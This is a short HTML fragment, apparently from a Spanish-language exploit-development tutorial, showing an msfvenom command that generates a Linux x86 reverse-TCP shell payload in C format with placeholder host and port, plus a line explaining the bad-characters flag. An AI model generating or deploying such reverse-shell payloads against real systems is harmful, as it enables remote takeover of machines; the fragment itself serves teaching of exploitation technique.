+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">msfvenom</span> <span class="at">-p</span> linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT <span class="dt">\</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-b</span> <span class="st">'\x00\x09\x0a\x20'</span> <span class="at">--platform</span> linux <span class="at">--arch</span> x86 <span class="at">-f</span> c</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p>El flag <code>-b</code> especifica bad characters a evitar.</p>
 
 
 </section>
